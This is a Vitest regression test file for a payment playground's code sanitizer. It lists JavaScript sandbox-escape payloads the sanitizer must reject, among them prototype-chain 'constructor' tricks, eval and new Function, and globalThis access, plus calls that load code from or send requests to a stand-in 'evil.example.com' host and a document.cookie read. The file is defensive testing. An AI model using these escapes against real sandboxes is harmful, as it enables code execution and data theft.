import { describe, expect, it } from 'vitest'
import { CodeSanitizer, sanitizeCode } from './codeSanitizer'

/**
 * Regression tests for the pay-playground code sanitizer.
 *
 * The security cases below encode the bypasses reported during review of
 * PR #44 and PR #76 (dynamic computed property names reaching the
 * prototype chain, e.g. `([])[c][c]('return process')()`), plus related
 * escape classes. The sanitizer must reject every one of them.
 */
describe('codeSanitizer', () => {
	describe('security: dynamic computed property bypasses (PR #44 / #76 review)', () => {
		const bypassCases: [string, string][] = [
			[
				'original PoC — const-bound binary expression key',
				`const c = 'constr' + 'uctor'\n;([])[c][c]('return process')()`,
			],
			[
				'direct binary expression key',
				`([])['constr' + 'uctor']['constructor']('return process')()`,
			],
			[
				'let-bound key',
				`let c = 'constructor'\n;([])[c][c]('return process')()`,
			],
			[
				'template literal with interpolation as key',
				`const k = \`con\${""}structor\`\n;([])[k][k]("return process")()`,
			],
			[
				'call result as key',
				`const c = ['constructor'].join('')\n;({})[c][c]('return process')()`,
			],
			[
				'static dangerous key on array literal',
				`[]['constructor']['constructor']('return process')()`,
			],
			[
				'static dangerous key on object literal',
				`({}).constructor.constructor('return process')()`,
			],
			[
				'this-rooted prototype traversal',
				`this.constructor.constructor('return process')()`,
			],
			[
				'this with dynamic key',
				`const c = 'constr' + 'uctor'\n;this[c][c]('return process')()`,
			],
			[
				'dynamic key on injected base param',
				`const c = 'constr' + 'uctor'\n;base[c][c]('return process')()`,
			],
			[
				'dynamic key on pay param',
				`const c = 'constr' + 'uctor'\n;pay[c]('x')`,
			],
			['globalThis member escape', `globalThis['eval']('return 1')()`],
			[
				'globalThis dot access escape',
				`globalThis.Function('return process')()`,
			],
			[
				'destructuring rebinds constructor',
				`const { constructor: f } = []\nf('return process')()`,
			],
			[
				'computed destructuring rebinds constructor',
				`const { ['constructor']: f } = []\nf('return process')()`,
			],
			[
				'computed dynamic destructuring key',
				`const c = 'constr' + 'uctor'\nconst { [c]: f } = []\nf('return process')()`,
			],
			['sequence-expression callee', `(0, eval)('return process')()`],
			['assignment to __proto__', 'const o = {}\no.__proto__ = globalThis'],
			['dynamic import', `await import('https://evil.example.com/x.js')`],
			['new Function', `new Function('return process')()`],
			['direct eval', `eval('return process')`],
			['proto shorthand key', 'const o = { __proto__: 1 }\nreturn o'],
		]

		it.each(bypassCases)('rejects: %s', (_name, code) => {
			const result = sanitizeCode(code)
			expect(result.isValid).toBe(false)
			expect(result.errors.length).toBeGreaterThan(0)
		})
	})

	describe('security: baseline denylist still enforced', () => {
		const denyCases: [string, string][] = [
			['fetch', `fetch('https://evil.example.com')`],
			['window access', 'window.location.href'],
			['document access', 'document.cookie'],
			['localStorage', `localStorage.setItem('k', 'v')`],
			['require', `require('fs')`],
			['setTimeout', 'setTimeout(() => {}, 0)'],
			['disallowed statement type', 'class A {}\nreturn A'],
			['labeled with statement', 'with (Math) { return floor(1.5) }'],
		]

		it.each(denyCases)('rejects: %s', (_name, code) => {
			const result = sanitizeCode(code)
			expect(result.isValid).toBe(false)
		})
	})

	describe('legit playground code still passes', () => {
		const allowCases: [string, string][] = [
			[
				'pay call with params object',
				`const result = await pay({ amount: '1000000', token: '0xabc', recipient: '0xdef' })\nreturn result`,
			],
			[
				'getPaymentStatus call',
				`const status = await getPaymentStatus('0xhash')\nconsole.log(status)`,
			],
			['base namespace access', `return base.pay({ amount: '1' })`],
			['base static string access', `return base['pay']({ amount: '1' })`],
			[
				'console methods',
				`console.log('a')\nconsole.error('b')\nconsole.warn('c')\nconsole.info('d')`,
			],
			[
				'JSON / Math / Object / Array / Promise utils',
				`const parsed = JSON.parse('{"a":1}')\nconst keys = Object.keys(parsed)\nconst n = Math.floor(1.9)\nconst arr = Array.from(keys)\nconst isArr = Array.isArray(arr)\nawait Promise.resolve(1)\nJSON.stringify(parsed)`,
			],
			[
				'for...of iteration (no dynamic indexing)',
				'const items = [1, 2, 3]\nlet total = 0\nfor (const item of items) {\n  total += item\n}\nreturn total',
			],
			['static numeric index', `const arr = ['a', 'b']\nreturn arr[0]`],
			[
				'static string key on user object',
				`const cfg = { timeout: 1000 }\nreturn cfg['timeout']`,
			],
			[
				'static template literal key',
				'const cfg = { timeout: 1000 }\nreturn cfg[`timeout`]',
			],
			[
				'template literal values',
				`const name = 'world'\nconsole.log(\`hello \${name}\`)`,
			],
			[
				'try/catch/throw',
				`try {\n  await pay({})\n} catch (e) {\n  console.error('failed', e)\n  throw e\n}`,
			],
			[
				'if/else, functions, ternary, logical ops',
				`const amount = 5 > 3 ? '5' : '3'\nfunction fmt(v) { return v && v.length ? v : '0' }\nif (amount) { console.log(fmt(amount)) } else { console.log('empty') }`,
			],
			[
				'optional chaining on user object',
				`const r = { status: 'ok' }\nreturn r?.status`,
			],
			[
				'object destructuring of data fields',
				`const r = { status: 'ok', hash: '0x1', amount: '2' }\nconst { status, hash, amount } = r\nreturn status + hash + amount`,
			],
			[
				'array literal methods on user objects',
				`const tags = ['a', 'b']\nreturn tags.length`,
			],
		]

		it.each(allowCases)('allows: %s', (_name, code) => {
			const result = sanitizeCode(code)
			expect(result.errors.map((e) => e.message)).toEqual([])
			expect(result.isValid).toBe(true)
			expect(result.sanitizedCode).toBeTruthy()
		})
	})

	describe('parse failures are reported, not thrown', () => {
		it('returns validation errors for syntactically invalid code', () => {
			const result = sanitizeCode('const c = (')
			expect(result.isValid).toBe(false)
			expect(result.errors.length).toBeGreaterThan(0)
			expect(result.sanitizedCode).toBe('')
		})

		it('strips import/export statements before validation', () => {
			const result = sanitizeCode(
				`import { pay } from '@startale/app-sdk'\nexport const x = 1\nreturn pay({})`,
			)
			// import/export are stripped; remaining code must validate cleanly
			expect(result.isValid).toBe(true)
		})
	})

	describe('error reporting carries location info', () => {
		it('reports line and column for a rejected property', () => {
			const sanitizer = new CodeSanitizer()
			const result = sanitizer.sanitize('\nconst o = {}\no.constructor')
			expect(result.isValid).toBe(false)
			const err = result.errors[0]
			expect(err.line).toBeDefined()
			expect(err.column).toBeDefined()
		})
	})
})
